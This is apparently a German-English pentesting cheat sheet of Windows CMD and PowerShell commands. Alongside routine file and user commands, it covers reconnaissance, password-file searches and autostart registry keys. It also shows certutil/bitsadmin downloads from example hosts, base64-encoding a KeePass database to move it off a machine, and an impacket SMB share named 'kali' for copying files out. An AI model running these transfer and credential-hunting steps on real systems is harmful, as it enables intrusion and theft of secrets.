## CMD

### Folder stuff
```cmd
cd
```

Ausgabe von Dateien (cat):
```cmd
type file.txt
```

Ausgabe Dateien im Ordner (ls):
```cmd
dir

# Mit versteckten Dateien
dir /A
```

Erstellen von Ordnern:
```cmd
mkdir

rmdir
```
### Systeminformation

```cmd
systeminfo
```

Ausgabe von Umgebungsvariablen:
```cmd
set
```

### Dateien

Schreiben von Dateien:
```cmd
echo "Text" > Datei.txt
```

Leere Datei:
```cmd
echo 2> Datei.txt
```

Datei löschen:
```cmd
del Datei.txt
```

Datei umbennen:
```cmd
rename Datei.txt
```

Datei verschieben:
```cmd
move Datei.txt .\Folder
```

Datei kopieren:
```cmd
copy Datei.txt Datei2.txt
```

Dateien vergleichen:
```cmd
fc Datei.txt Datei2.txt
```

Suchen von Dateien (kein eigenes Tool):
```cmd
# Sucht im aktuellen Verzeichnis nach Datei
dir /s Datei.txt

dir /s *.txt
```

Text **in** Dateien suchen (auch als Grep verwendbar):
```cmd
find "Passwort" Datei.txt

findstr "Mehrere Strings" Datei.txt
```

Dateisystem:
```cmd
fsutil

# Drives ausgeben
fsutil fsinfo drives
```

### User
Ausgabe des aktuellen Nutzers:
```cmd
whoami /user
```

Aktuelle Privilegien anzeigen:
```cmd
whoami /priv (/all)
```

Gruppen und Usermanagement:
```cmd
# Infos über einen User
net user User

# User hinzufügen
net user /add

# Lokale Gruppe hinzufügen
net localgroup User
```

### Berechtigungen

Berechtigungen anzeigen:
```cmd
icacls Folder
```

Dateien mit erhöhten Rechten ausführen:
```cmd
runas test.ps1
```

### Prozesse

Prozesse anzeigen:
```cmd
tasklist

# Weiter filtern
tasklist /fi "imagename eq cmd.exe"
```

Scheduled tasks:
```cmd
schtasks

schtasks /create
```

Registry:
```cmd
reg /?
```

Programme die beim starten ausgeführt werden:
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce

## Powershell

Get systeminformation:
```powershell
Get-WmiObject Win32_ComputerSystem
```

List security patches:
```powershell
Get-Hotfix -description "Security update"
```


### Allgemeines & Grundlagen

Hilfe anzeigen:  
  ```
  Get-Help <Cmdlet-Name>
  ```

Alle verfügbaren Cmdlets auflisten:  
  ```
  Get-Command
  ```

Alias für Cmdlets anzeigen:  
  ```
  Get-Alias
  ```

Pipeline nutzen:  
  ```
  Get-Service | Where-Object Status -EQ Running | Select-Object Name
  ```

### System- und Netzwerk-Reconnaissance

Aktive Netzwerkverbindungen anzeigen:  
  ```
  Get-NetTCPConnection | Format-Table -AutoSize
  ```

Netzwerkadapter-Infos:  
  ```
  Get-NetAdapter | Format-Table -AutoSize
  ```

DNS-Cache anzeigen:  
  ```
  Get-DnsClientCache | Format-Table -AutoSize
  ```

Ping/Netzwerkverbindung testen:  
  ```
  Test-NetConnection -ComputerName <Ziel>
  ```

IP-Konfiguration anzeigen:  
  ```
  Get-NetIPConfiguration
  ```

### Benutzer & Rechte

Aktiven Benutzer anzeigen:  
  ```
  whoami
  ```

Eigene Gruppenmitgliedschaften anzeigen:  
  ```
  whoami /groups
  ```

Lokale Benutzer anzeigen (eingeschränkt):  
  ```
  net user
  ```

### Prozesse & Programme

Laufende Prozesse anzeigen:  
  ```
  Get-Process | Format-Table Name,Id,Path
  ```

Installierte Programme auflisten (nur für eigenen User sichtbar):  
  ```
  Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName,DisplayVersion,Publisher
  ```

### Dateisystem & Suche

Nach Dateien mit Passwort-Hinweisen suchen:  
  ```
  dir /b /s *pass*
  ```

Dateien mit bestimmten Endungen finden:  
  ```
  Get-ChildItem -Recurse -Include *.config
  ```

Eigene Dateien durchsuchen:  
  ```
  Get-ChildItem "$env:USERPROFILE" -Recurse -ErrorAction SilentlyContinue
  ```

### Sonstiges & Hilfreiche Befehle

Datei kopieren:  
  ```
  Copy-Item <Quelle> <Ziel>
  ```

Datei verschieben:  
  ```
  Move-Item <Quelle> <Ziel>
  ```

Datei löschen:  
  ```
  Remove-Item <Dateipfad>
  ```

Logdatei live überwachen (tail):  
  ```
  Get-Content <Datei> -Tail 10 -Wait
  ```

Eigene Umgebungsvariablen anzeigen:  
  ```
  Get-ChildItem Env:
  ```

Eigene PowerShell-ExecutionPolicy anzeigen:  
  ```
  Get-ExecutionPolicy
  ```

## File Transfer:

### CMD:

Curl:
```cmd
curl 127.0.0.1 -o file
```

```cmd
bitsadmin /transfer jobname /download /priority normal "http://example.com/datei.zip" "C:\Pfad\datei.zip"
```

```cmd
certutil -urlcache -split -f "http://example.com/datei.zip" "datei.zip"
```

Powershell:
```powershell
Invoke-WebRequest "http://url_zur_datei" -OutFile "lokaler_Pfad\Dateiname"
```

```powershell
wget "http://url_zur_datei" -OutFile "lokaler_Pfad\Dateiname"
```

```powershell
Start-BitsTransfer -Source "http://url_zur_datei" -Destination "lokaler_Pfad\Dateiname"
```

```powershell
[convert]::ToBase64String((Get-Content -path "C:\users\bob\documents\Database.kdbx"
-Encoding byte))
```

=>
```bash
echo "A9mimmf7S7UBAAMAAhAAMcHy5r9xQ1C+WAUhavxa/wMEAAEAAAAEIADwMjakIrOmKjXoiAtsOFsZrOMd
…
ChKxkL40QoEcNR4lulm6spUfDOfD5NZTxcMJnPTtJqqgdzOnUzUB/QGlCspNFaCyNCuVsZFdBIqAQsb9CJOANu
TsZNa3y67DOFi0BRDx9T2RC7L87ZPx4lsGdiKNV6D1Oda3D+L+F6kJHJ1TYfwPIzpxaZRYpCDzRtFgMc4JD4qA
==" | base64 -d > database.kdbx
```

SMB:
```bash
impacket-smbserver -smb2support kali .
```

```powershell
copy file \\127.0.0.1\kali
```
